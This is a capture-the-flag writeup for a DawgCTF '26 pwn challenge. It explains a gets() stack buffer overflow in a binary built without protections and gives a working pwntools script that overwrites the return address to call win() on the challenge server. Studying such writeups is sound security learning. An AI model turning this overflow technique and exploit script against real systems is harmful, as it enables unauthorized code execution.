# Stacking Flags — DawgCTF '26 Writeup

**Category:** Binary Exploitation (pwn)  
**Points:** 100  
**Solves:** 159 teams  
**Flag:** `DawgCTF{$taching_br1cks}`

## Challenge

A remote service at `nc.umbccd.net:8921` runs a binary with a classic buffer overflow vulnerability. Source code is provided.

## Analysis

The source (`Stacking_flags.c`) reveals:

- A `win()` function that reads and prints `flag.txt`.
- A `vulnerable_function()` that calls `gets()` on a 64-byte stack buffer — textbook buffer overflow.
- The binary is compiled with all protections disabled: `-fno-stack-protector -no-pie -z execstack`.
- After `vulnerable_function()` returns, the program prints the address of `win()`.

Since `gets()` has no bounds checking, we can overwrite the saved return address on the stack to redirect execution to `win()`.

## Exploit Strategy

1. **Leak `win()` address:** Send a short (non-overflowing) input, let the function return normally, and read the printed address. With `-no-pie`, the address is fixed (`0x4011a6`), but we leak it dynamically for robustness.
2. **Overflow and redirect:** Reconnect and send `72` bytes of padding (64-byte buffer + 8-byte saved RBP) followed by the leaked address of `win()` packed as a 64-bit little-endian value.

## Exploit

```python
from pwn import *

r = remote("nc.umbccd.net", 8921)
r.sendline(b"A")
response = r.recvall(timeout=5)
win_addr = int(re.search(rb"0x([0-9a-f]+)", response).group(0), 16)
r.close()

r = remote("nc.umbccd.net", 8921)
r.sendline(b"A" * 72 + p64(win_addr))
print(r.recvall(timeout=5))
```

## Result

```
DawgCTF{$taching_br1cks}
```
